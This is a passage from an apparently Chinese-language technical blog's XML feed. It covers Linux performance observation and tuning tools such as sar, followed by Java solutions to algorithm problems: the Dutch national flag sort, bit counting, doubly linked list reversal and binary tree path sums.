性能观测工具</strong></h3><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_b6b166f3298163ac09b6685b98858fb3.png" alt="img"></p><p>▪ 首先学习的Basic Tool有如下：<br>uptime、top(htop)、mpstat、isstat、vmstat、free、ping、nicstat、dstat。</p><p>▪ 高级的命令如下：<br>sar、netstat、pidstat、strace、tcpdump、blktrace、iotop、slabtop、sysctl、/proc。</p><p>更多参考：<a href="http://www.open-open.com/lib/view/open1434589043973.html，详细的命令使用方法可以参考man" target="_blank" rel="noopener">http://www.open-open.com/lib/view/open1434589043973.html，详细的命令使用方法可以参考man</a></p><h3 id="二、Linux-benchmarking-tools-Linux-性能测评工具"><a href="#二、Linux-benchmarking-tools-Linux-性能测评工具" class="headerlink" title="二、Linux benchmarking tools | Linux 性能测评工具"></a><strong>二、Linux benchmarking tools | Linux 性能测评工具</strong></h3><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_297d3a62fcd5803f272e98a23b4df300.png" alt="img"></p><p>是一款性能测评工具，对于不同模块的性能测试可以使用相应的工具，想要深入了解，可以参考最下文的附件文档。</p><h3 id="三、Linux-tuning-tools-Linux-性能调优工具"><a href="#三、Linux-tuning-tools-Linux-性能调优工具" class="headerlink" title="三、Linux tuning tools | Linux 性能调优工具"></a><strong>三、Linux tuning tools | Linux 性能调优工具</strong></h3><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_3552705daa99f0be64ab0261c7d04221.png" alt="img"><br>是一款性能调优工具，主要是从linux内核源码层进行的调优，想要深入了解，可以参考下文附件文档。</p><h3 id="四、Linux-observability-sar-linux性能观测工具"><a href="#四、Linux-observability-sar-linux性能观测工具" class="headerlink" title="四、Linux observability sar | linux性能观测工具"></a><strong>四、Linux observability sar | linux性能观测工具</strong></h3><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_33718c31204bfbe49a13dea6d0f3531f.png" alt="img"></p><p>sar（System Activity Reporter系统活动情况报告）是目前LINUX上最为全面的系统性能分析工具之一，可以从多方面对系统的活动进行报告，包括：文件的读写情况、系统调用的使用情况、磁盘I/O、CPU效率、内存使用状况、进程活动及IPC有关的活动等方面。</p><p>sar的常归使用方式：sar  [options] [-A] [-o file]  t [n]<br>其中：<br>t为采样间隔，n为采样次数，默认值是1；<br>-o file表示将命令结果以二进制格式存放在文件中，file 是文件名。<br>options 为命令行选项<br>更多参考: <a href="http://blog.csdn.net/mig_davidli/article/details/52149993" target="_blank" rel="noopener">http://blog.csdn.net/mig_davidli/article/details/52149993</a><br>想要更深入的了解，可以参考附件文件。</p><p>▲参考详单：<br> LCA2017_BPF_tracing_and_more<br> LISA2014_LinuxPerfAnalysisNewTools<br> Percona2016_LinuxSystemsPerf<br> SCaLE_Linux_vs_Solaris_Performance2014<br> SCALE2015_Linux_perf_profiling<br> SCALE2016_Broken_Linux_Performance_Tools<br> SREcon_2016_perf_checklists<br> Velocity2015_LinuxPerfTools</p><p>本文转自：<a href="https://blog.csdn.net/u010647035/article/details/85037206" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>荷兰国旗问题</title>
      <link href="/2019/03/10/suan-fa/pai-xu/he-lan-guo-qi-wen-ti/"/>
      <url>/2019/03/10/suan-fa/pai-xu/he-lan-guo-qi-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="荷兰国旗问题"><a href="#荷兰国旗问题" class="headerlink" title="荷兰国旗问题"></a>荷兰国旗问题</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一些红色/白色/蓝色的条状物，你要排序把相同颜色的放在一起，并且整体的颜色是按照红/白/蓝的顺序排列的。这三种颜色放在一起后就形成了荷兰国旗。</p><p>维基百科链接：<a href="https://en.wikipedia.org/wiki/Dutch_national_flag_problem" target="_blank" rel="noopener">Dutch national flag problem</a></p><pre><code>比如说，我们用 0, 1, 2 表示红/白/蓝三种颜色，给你一个包含 0, 1, 2 的整数数组：2, 1, 2, 1, 0你要返回排序后的结果是：0, 1, 1, 2, 2</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sortThreeColorsCount</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">++</span>cnt0<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">++</span>cnt1<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token operator">++</span>cnt2<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cnt0<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> nums<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cnt1<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> nums<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cnt2<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> nums<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sortThreeColorsSwap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> mid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token operator">++</span><span class="token punctuation">,</span> mid<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">++</span>mid<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> right<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> i <span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>连续自然数二进制中 1 的个数</title>
      <link href="/2019/03/10/suan-fa/wei-yun-suan/lian-xu-zi-ran-shu-er-jin-zhi-zhong-1-de-ge-shu/"/>
      <url>/2019/03/10/suan-fa/wei-yun-suan/lian-xu-zi-ran-shu-er-jin-zhi-zhong-1-de-ge-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="连续自然数二进制中-1-的个数"><a href="#连续自然数二进制中-1-的个数" class="headerlink" title="连续自然数二进制中 1 的个数"></a>连续自然数二进制中 1 的个数</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个非负整数 n，你要分别计算出 0 ~ n 这 n + 1 个整数的二进制表示中 1 的个数，将结果以数组的形式返回。</p><pre><code>比如说，给你的整数 n 等于 4：n = 4你要分别计算出 0/1/2/3/4 这 5 个数的二进制表示中 1 的个数。我们先把这 5 个数的二进制表示写出来：0: 01: 12: 103: 114: 100于是可以得到这 5 个数二进制表示中 1 的个数分别是 0/1/1/2/1，返回这个数组即可：[0, 1, 1, 2, 1]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(k), Space: O(1)</span>  <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">numberOfOne</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token operator">++</span>count<span class="token punctuation">;</span>      n <span class="token operator">&amp;=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> count<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*k), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">countBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">numberOfOne</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> d<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">countBitsOn</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>i <span class="token operator">&amp;</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> d<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反转双向链表</title>
      <link href="/2019/03/04/suan-fa/lian-biao/fan-zhuan-shuang-xiang-lian-biao/"/>
      <url>/2019/03/04/suan-fa/lian-biao/fan-zhuan-shuang-xiang-lian-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="反转双向链表"><a href="#反转双向链表" class="headerlink" title="反转双向链表"></a>反转双向链表</h2><p><strong>问题</strong></p><p>给你一条双向链表。请使用一趟扫描完成反转。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">// 双向链表</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">DoubleNode</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> value<span class="token punctuation">;</span>        DoubleNode last<span class="token punctuation">;</span>        DoubleNode next<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">DoubleNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 反转双向链表</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> DoubleNode <span class="token function">reverseList</span><span class="token punctuation">(</span>DoubleNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>        DoubleNode pre <span class="token operator">=</span> null<span class="token punctuation">;</span>        DoubleNode next <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            next <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            head<span class="token punctuation">.</span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span>            head<span class="token punctuation">.</span>last <span class="token operator">=</span> next<span class="token punctuation">;</span>            pre <span class="token operator">=</span> head<span class="token punctuation">;</span>            head <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树中和为给定值的路径</title>
      <link href="/2019/02/26/suan-fa/er-cha-shu/er-cha-shu-zhong-he-wei-gei-ding-zhi-de-lu-jing/"/>
      <url>/2019/02/26/suan-fa/er-cha-shu/er-cha-shu-zhong-he-wei-gei-ding-zhi-de-lu-jing/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树中和为给定值的路径"><a href="#二叉树中和为给定值的路径" class="headerlink" title="二叉树中和为给定值的路径"></a>二叉树中和为给定值的路径</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树和一个整数，你要找到这棵二叉树上从根到叶子节点路径和等于这个整数的所有路径。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">    1</span>  /   \ 2     4  \   / \  10 8  16给你的整数是 13。在这棵二叉树中存在两条从根到叶子节点的路径，它们的路径和等于 13。分别是：[  [1, 2, 10],  [1, 4, 8]]因此你要返回以上两条路径。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">path</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">,</span>                    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> root<span class="token punctuation">.</span>right <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> root<span class="token punctuation">.</span>val <span class="token operator">==</span> sum<span class="token punctuation">)</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">path</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> sum <span class="token operator">-</span> root<span class="token punctuation">.</span>val<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">path</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> sum <span class="token operator">-</span> root<span class="token punctuation">.</span>val<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T: O(1)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">pathSumRecursive</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">path</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> sum<span class="token punctuation">,</span> elem<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">pathSumIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Set<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> curSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null <span class="token operator">||</span> <span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        curSum <span class="token operator">+=</span> root<span class="token punctuation">.</span>val<span class="token punctuation">;</span>        visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      TreeNode n <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>right <span class="token operator">==</span> null <span class="token operator">||</span> visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> n<span class="token punctuation">.</span>right <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> curSum <span class="token operator">==</span> sum<span class="token punctuation">)</span>          result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        curSum <span class="token operator">-=</span> n<span class="token punctuation">.</span>val<span class="token punctuation">;</span>        root <span class="token operator">=</span> null<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> root <span class="token operator">=</span> n<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">pathSumIterativePrev</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    TreeNode prev <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">int</span> curSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null <span class="token operator">||</span> <span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        curSum <span class="token operator">+=</span> root<span class="token punctuation">.</span>val<span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      <span class="token 